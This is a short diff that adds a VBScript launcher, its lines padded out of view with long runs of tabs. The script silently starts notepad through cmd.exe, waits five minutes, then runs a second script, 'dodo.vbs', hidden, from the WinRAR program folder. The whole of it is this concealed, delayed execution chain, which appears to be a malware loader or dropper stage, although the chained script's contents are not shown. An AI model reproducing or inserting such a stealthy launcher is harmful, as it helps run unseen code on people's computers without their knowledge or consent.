@@ -1,0 +1,5 @@
+								 DIM objShell
+								 set objShell=Wscript.createObject("wscript.shell")
+								 iReturn=objShell.Run("cmd.exe /C C:\Windows\system32\notepad.exe", 0, TRUE)
+								 Wscript.Sleep 300000
+								 iReturn=objShell.Run("wscript.exe  D:\PROGRA~1\WinRAR\dodo.vbs", 0, TRUE)								
